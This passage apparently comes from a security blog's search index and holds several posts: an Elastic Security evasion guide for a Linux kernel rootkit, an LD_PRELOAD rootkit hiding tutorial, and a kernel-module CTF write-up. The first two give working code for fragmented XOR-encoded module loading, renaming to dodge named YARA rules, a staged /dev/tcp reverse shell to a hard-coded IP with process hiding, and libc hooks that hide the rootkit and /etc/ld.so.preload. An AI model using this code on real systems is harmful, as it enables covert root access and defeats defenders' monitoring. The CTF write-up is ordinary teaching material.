static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn 